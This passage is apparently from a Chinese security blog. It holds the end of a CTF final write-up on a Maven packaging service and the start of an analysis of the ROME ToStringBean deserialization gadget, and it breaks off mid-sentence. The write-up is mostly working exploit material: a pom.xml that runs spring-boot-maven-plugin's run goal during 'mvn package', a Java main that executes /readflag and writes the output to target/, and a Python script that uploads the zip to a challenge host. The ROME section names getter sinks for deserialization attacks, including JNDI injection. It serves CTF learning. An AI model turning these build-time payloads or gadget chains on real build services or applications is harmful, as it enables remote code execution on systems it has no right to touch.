class_">String</span>(data).getBytes(), data)) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;invalid zip file&quot;</span>, HttpStatus.OK);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            zipFile.extractAll(projectDir.getAbsolutePath(), parameters);<br>        &#125;<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;mvn&quot;</span>, <span class="hljs-string">&quot;package&quot;</span>, <span class="hljs-string">&quot;-Dmaven.test.skip=true&quot;</span>, <span class="hljs-string">&quot;--offline&quot;</span>)<br>                .directory(projectDir)<br>                .start()<br>                .waitFor();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">targetDir</span> <span class="hljs-operator">=</span> Paths.get(projectDir.getAbsolutePath(), <span class="hljs-string">&quot;target&quot;</span>).toFile();<br>        <span class="hljs-keyword">if</span> (!targetDir.exists()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;target dir not found&quot;</span>, HttpStatus.NOT_FOUND);<br>        &#125;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">targetZipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(projectDir, <span class="hljs-string">&quot;target.zip&quot;</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(targetZipFile)) &#123;<br>            <span class="hljs-type">ZipParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipParameters</span>();<br>            parameters.setSymbolicLinkAction(ZipParameters.SymbolicLinkAction.INCLUDE_LINK_ONLY);<br>            zipFile.addFolder(targetDir);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(Files.readAllBytes(Paths.get(targetZipFile.getAbsolutePath())), HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>net.lingala.zip4j è¿™ä¸ªåŒ…ä¼¼ä¹æ— æ³•zip slip</p><p>æŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net.lingala.zip4j.exception.ZipException: illegal file name that breaks out of the target directory: ../a.txt<br></code></pre></td></tr></table></figure><p>maven.configå¯ä»¥åŠ è½½é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ca29ecffef7e:/tmp/test# <span class="hljs-built_in">ls</span> -al<br>total 20<br>drwxr-xr-x 3 root root 4096 Aug  4 03:49 .<br>drwxrwxrwt 1 root root 4096 Aug  4 04:09 ..<br>drwxr-xr-x 2 root root 4096 Aug  4 04:09 .mvn<br>-rw-r--r-- 1 root root  859 Aug  4 03:47 pom.xml<br>root@ca29ecffef7e:/tmp/test# <span class="hljs-built_in">ls</span> -al .mvn/<br>total 12<br>drwxr-xr-x 2 root root 4096 Aug  4 04:09 .<br>drwxr-xr-x 3 root root 4096 Aug  4 03:49 ..<br>-rw-r--r-- 1 root root  165 Aug  4 03:45 maven.config<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå¤§å°é™åˆ¶äº†ï¼Œmaybeæ˜¯è¦è‡ªå·±å†™ä¸€ä¸ªmavenæ’ä»¶è¿‡å»ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">spring.servlet.multipart.max-file-size=128KB<br>spring.servlet.multipart.max-request-size=256KB<br></code></pre></td></tr></table></figure><p>è¿œç¨‹ç¯å¢ƒæœ‰ spring-boot-maven-plugin è¿™ä¸ªæ’ä»¶ï¼Œåˆ©ç”¨è¿™ä¸ªæ’ä»¶å¯ä»¥åœ¨mvn packageæ—¶è¿è¡Œå½“å‰é¡¹ç›®ã€‚</p><p>åç»­å¯ä»¥é€šè¿‡å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥targetç›®å½•æ¥å®ç°å›æ˜¾ã€‚</p><p>poc3.zipï¼š</p><p><img src="/2024/08/11/jqctf-final/image-20240811224655411.png" alt="image-20240811224655411"></p><p>pom.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>17<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Add other dependencies as needed --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Spring Boot Plugin --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- &lt;version&gt;3.3.1&lt;/version&gt; --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!-- æŒ‡å®šè¿è¡Œçš„ç›®æ ‡ --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>run<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>                    <span class="hljs-comment">&lt;!-- é…ç½®è¯¥æ’ä»¶æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸé˜¶æ®µ --&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>MavenPackerApplication.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MavenPackerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// Example command to execute</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/readflag&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./target/flag.txt&quot;</span>);<br><br>        <span class="hljs-comment">// Execute the command</span><br>        executeCommand(command, outputFile);<br><br>        SpringApplication.run(MavenPackerApplication.class, args);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String command, File outputFile)</span> &#123;<br>        <span class="hljs-comment">// Create a ProcessBuilder with the command</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(command.split(<span class="hljs-string">&quot; &quot;</span>));<br>        <br>        <span class="hljs-comment">// Redirect output to the specified file</span><br>        processBuilder.redirectOutput(outputFile);<br>        processBuilder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Start the process</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <br>            <span class="hljs-comment">// Wait for the process to complete</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">exitCode</span> <span class="hljs-operator">=</span> process.waitFor();<br>            System.out.println(<span class="hljs-string">&quot;Process exited with code: &quot;</span> + exitCode);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>settings.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>/home/app/.m2/repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>f = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;poc3.zip&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)&#125;<br><br>p = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;<br><br><br>res = requests.post(<span class="hljs-string">&quot;http://30.222.0.20:45807/pack&quot;</span>, files=f, proxies=p)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(res.content)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rome</title>
    <link href="/2024/08/10/Rome/"/>
    <url>/2024/08/10/Rome/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ROME is a Java framework for RSS and Atom feeds</p><p>RSS ï¼š Really Simple Syndicationï¼ˆçœŸæ­£ç®€æ˜“è”åˆï¼‰</p><p>æ˜¯ä¸€ç§æ¶ˆæ¯æ¥æºæ ¼å¼è§„èŒƒï¼Œç”¨ä»¥èšåˆç»å¸¸å‘å¸ƒæ›´æ–°æ•°æ®çš„ç½‘ç«™ï¼Œä¾‹å¦‚åšå®¢æ–‡ç« ã€æ–°é—»ã€éŸ³é¢‘æˆ–è§†é¢‘çš„ç½‘æ‘˜ã€‚å…¶ä½¿ç”¨XMLç¼–å†™</p><p>RSS é˜…è¯»å™¨ç”¨äºè¯»å– RSS feedã€‚ROMEå°±æ˜¯ä¸€ä¸ªRSS é˜…è¯»å™¨çš„å®ç°ã€‚</p><p>Rome æä¾›äº† <strong>ToStringBean</strong> è¿™ä¸ªç±»ï¼Œæä¾›æ·±å…¥çš„ toString æ–¹æ³•å¯¹JavaBeanè¿›è¡Œæ“ä½œï¼Œè¿™ä¹Ÿæ˜¯é—®æˆ‘ä»¬ç”¨Romeæ‰“ååºåˆ—åŒ–çš„<strong>æ ¸å¿ƒåˆ©ç”¨ç‚¹</strong>ã€‚</p><h2 id="æµ…æ"><a href="#æµ…æ" class="headerlink" title="æµ…æ"></a>æµ…æ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToStringBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123; <span class="hljs-comment">// å®ç°äº†Serializableæ¥å£</span><br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">ToStringBean</span><span class="hljs-params">(Class beanClass)</span> &#123;<br>        _beanClass = beanClass;<br>        _obj = <span class="hljs-built_in">this</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Stack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> (Stack) PREFIX_TL.get();<br>        String[] tsInfo = (String[]) ((stack.isEmpty()) ? <span class="hljs-literal">null</span> : stack.peek());<br>        String prefix;<br>        <span class="hljs-keyword">if</span> (tsInfo==<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> _obj.getClass().getName();<br>            prefix = className.substring(className.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prefix = tsInfo[<span class="hljs-number">0</span>];<br>            tsInfo[<span class="hljs-number">1</span>] = prefix;<br>        &#125;<br>        <span class="hljs-keyword">return</span> toString(prefix);<br>    &#125;<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">(String prefix)</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">128</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);<br>            <span class="hljs-keyword">if</span> (pds!=<span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pds.length;i++) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>                    <span class="hljs-keyword">if</span> (pReadMethod!=<span class="hljs-literal">null</span> &amp;&amp;                             <span class="hljs-comment">// ensure it has a getter method</span><br>                        pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; <span class="hljs-comment">// filter Object.class getter methods</span><br>                        pReadMethod.getParameterTypes().length==<span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">// filter getter methods that take parameters</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> pReadMethod.invoke(_obj,NO_PARAMS);<br>                        printProperty(sb,prefix+<span class="hljs-string">&quot;.&quot;</span>+pName,value);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            sb.append(<span class="hljs-string">&quot;\n\nEXCEPTION: Could not complete &quot;</span>+_obj.getClass()+<span class="hljs-string">&quot;.toString(): &quot;</span>+ex.getMessage()+<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>toString(String prefix)</code>æœ‰å¯ç–‘çš„<code>pReadMethod.invoke</code></p><p><code>BeanIntrospector.getPropertyDescriptors(_beanClass);</code>èƒ½å¤Ÿè·å–ç±»ä¸­çš„å±æ€§ååŠå…¶getteræ–¹æ³•ï¼ˆgetteréœ€è¦publicï¼‰</p><p>å¯ä»¥æœ¬åœ°è¯•è¯•ï¼š</p><p>æ–°å»ºä¸€ä¸ª<code>Person</code>ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(Person.class);<br><span class="hljs-keyword">if</span> (pds != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pds.length; i++) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>        System.out.println(pReadMethod.getName());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//        getName </span><br><span class="hljs-comment">//        getClass</span><br><span class="hljs-comment">//        getAge</span><br></code></pre></td></tr></table></figure><p>æ¥ç€éå†<code>PropertyDescriptor</code>æ•°ç»„ï¼Œå¯¹äºæ¯ä¸ªgetteræ–¹æ³•ï¼Œè‹¥å…¶ä¸æ˜¯Classç±»çš„getteræ–¹æ³•ï¼ˆä¸€èˆ¬å°±æ˜¯<code>getClass</code>äº†ï¼‰ï¼Œä¸”æ— å‚ï¼Œåˆ™æ‰§è¡Œè¯¥æ–¹æ³•ï¼ˆ<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>ï¼‰</p><p>åœ¨<code>FastJson</code>é‚£èŠ‚æˆ‘ä»¬å°±æ¥è§¦äº†å‡ ä¸ªå¯ä»¥åˆ©ç”¨<code>getter</code>æ–¹æ³•çš„æ¶æ„ç±»</p><ul><li><code>TemplatesImpl#getOutputProperties</code>ï¼ˆfastjsonä¸­éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼‰</li><li><code>JdbcRowSetImpl#getDatabaseMetaData()</code>ï¼ˆjndiæ³¨å…¥ï¼Œéœ€è¦å‡ºç½‘ï¼‰</li><li><code>BasicDataSource#getConnection</code>ï¼ˆBCELç 